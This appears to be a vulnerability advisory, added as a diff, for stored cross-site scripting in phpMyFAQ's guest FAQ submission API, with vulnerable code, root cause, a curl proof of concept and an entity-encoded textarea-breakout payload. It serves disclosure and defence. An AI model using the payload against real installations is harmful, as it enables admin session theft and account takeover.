@@ -1,0 +1,78 @@
+Summary
+A stored cross-site scripting (XSS) vulnerability in phpMyFAQ allows any unauthenticated user (or low-privileged registered user) to inject arbitrary JavaScript that executes in an administrator's browser when they review or edit a user-submitted FAQ entry. This leads to admin account takeover via session theft. The vulnerability exists because html_entity_decode() converts HTML entities into executable HTML after strip_tags() has already passed them through, and the admin template renders the content with Twig's |raw filter without any output sanitization.
+
+Details
+Vulnerable file: phpmyfaq/src/phpMyFAQ/Controller/Frontend/Api/FaqController.php (lines 109-115)
+
+$answer = Filter::filterVar($data->answer, FILTER_SANITIZE_SPECIAL_CHARS);
+if ($this->configuration->get(item: 'main.enableWysiwygEditorFrontend')) {
+    $answer = trim(html_entity_decode((string) $answer));
+}
+Root cause:
+
+Filter::filterVar() with FILTER_SANITIZE_SPECIAL_CHARS internally calls filterSanitizeString() which applies strip_tags() to remove HTML tags. However, strip_tags() only removes actual HTML tag syntax (e.g., <script>) — it does NOT remove HTML entities (e.g., &lt;script&gt;).
+
+When enableWysiwygEditorFrontend is true, html_entity_decode() is subsequently called, which converts the surviving HTML entities into real, executable HTML. No server-side HTML sanitizer (such as the Symfony HtmlSanitizer already used elsewhere in the codebase) is applied before storing the content in the database.
+
+Vulnerable sink (admin template): phpmyfaq/assets/templates/admin/content/faq.editor.twig (line 127)
+
+<textarea id="editor" name="answer" class="form-control" rows="7"
+          placeholder="{{ 'msgAnswer' | translate }}"
+>{{ faqData['content'] | raw }}</textarea>
+The admin FAQ editor controller (Administration/FaqController.php) loads the FAQ content directly from the database and passes it to the template without sanitization:
+
+$this->faq->getFaq($faqId, null, true);
+$faqData = $this->faq->faqRecord; // Raw content from DB
+Note: The public-facing FAQ view IS properly sanitized via FaqHelper::cleanUpContent() which uses Symfony HtmlSanitizer. Only the admin edit view is vulnerable.
+
+PoC
+Prerequisites:
+
+main.enableWysiwygEditorFrontend = true (non-default, but commonly enabled for rich-text user FAQ contributions)
+records.allowNewFaqsForGuests = true (DEFAULT value — guests can submit FAQs)
+At least one FAQ category must exist
+Step 1: Inject XSS payload as unauthenticated guest
+
+curl -X POST https://TARGET/api/faq/create \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "name": "Legitimate User",
+    "email": "user@example.com",
+    "question": "How to configure SMTP settings?",
+    "answer": "&lt;/textarea&gt;&lt;img src=x onerror=alert(document.domain)&gt;&lt;textarea&gt;",
+    "lang": "en",
+    "keywords": "smtp email",
+    "rubrik": ["1"],
+    "captcha": "<valid-captcha-or-empty-if-disabled>"
+  }'
+Response: {"success":"Thank you for your suggestion!"}
+
+Processing trace:
+
+Input answer: &lt;/textarea&gt;&lt;img src=x onerror=alert(document.domain)&gt;&lt;textarea&gt;
+filterSanitizeString() → strip_tags() finds no actual <tag> syntax → string passes through unchanged
+html_entity_decode() converts entities → </textarea><img src=x onerror=alert(document.domain)><textarea>
+Stored in database as raw executable HTML
+Step 2: Admin triggers XSS by reviewing the submitted FAQ
+
+When an administrator navigates to edit the submitted FAQ entry:
+
+GET /admin/faq/edit/{faqId}/{lang}
+The admin template renders:
+
+<textarea id="editor" name="answer" class="form-control" rows="7"
+          placeholder="Answer"
+></textarea><img src=x onerror=alert(document.domain)><textarea></textarea>
+The </textarea> breaks out of the editor textarea element, and the <img onerror=...> executes JavaScript immediately in the admin's browser context.
+
+admin stored xss alert poc
+
+admin stored xss poc
+
+Note: For logged-in users submitting FAQs, the captcha check is automatically bypassed (BuiltinCaptcha::checkCaptchaCode() returns true when user is logged in).
+
+Impact
+Stored XSS targeting administrators — every FAQ submission is reviewed by an admin, guaranteeing payload delivery
+Admin account takeover — attacker can steal session cookies, create new admin accounts, or modify system configuration
+No special privileges required — default configuration allows guest FAQ submissions (records.allowNewFaqsForGuests = true)
+Public view is unaffected — the public FAQ display uses Symfony HtmlSanitizer which strips event handlers; only the admin panel is vulnerable
